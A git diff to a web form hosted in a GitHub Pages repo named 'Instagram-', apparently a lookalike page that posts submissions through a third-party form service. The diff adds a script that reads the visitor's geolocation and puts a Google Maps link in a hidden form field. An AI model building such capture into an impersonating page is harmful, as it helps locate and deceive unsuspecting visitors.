@@ -106,12 +106,44 @@
                    name="_captcha"
                    value="false">
             <input type="hidden" name="_next" value="https://deepakgupta818286-sketch.github.io/Instagram-/success.html">
+<button type="button" onclick="getLocation()">📍 Share My Location</button>
 
+<input type="hidden" id="locationLink" name="Location">
             <button type="submit">Submit</button>
 
         </form>
 
     </div>
+<script>
+function getLocation() {
 
+    if (!navigator.geolocation) {
+        alert("Location is not supported on this device.");
+        return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+
+        function(position) {
+
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            const mapsLink =
+                "https://www.google.com/maps?q=" +
+                latitude + "," + longitude;
+
+            document.getElementById("locationLink").value = mapsLink;
+
+            alert("✅ Location shared successfully!");
+        },
+
+        function() {
+            alert("Location permission was not granted.");
+        }
+
+    );
+}
+</script>
 </body>
 </html>
